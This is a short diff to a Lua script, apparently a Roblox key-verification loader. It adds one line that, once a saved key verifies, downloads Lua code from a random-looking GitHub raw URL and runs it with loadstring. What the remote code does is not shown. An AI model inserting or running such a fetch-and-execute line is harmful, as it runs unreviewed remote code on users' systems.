@@ -256,6 +256,7 @@ if savedKey then
     if verify(savedKey) then
         onMessage("Saved key is valid!")
         screenGui.Enabled = false
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/vldtncywdlojtnvjlmvyrbszljd/asedesa/main/zxcv.lua",true))()
     else
         onMessage("Saved key is invalid, please enter a new key.")
     end
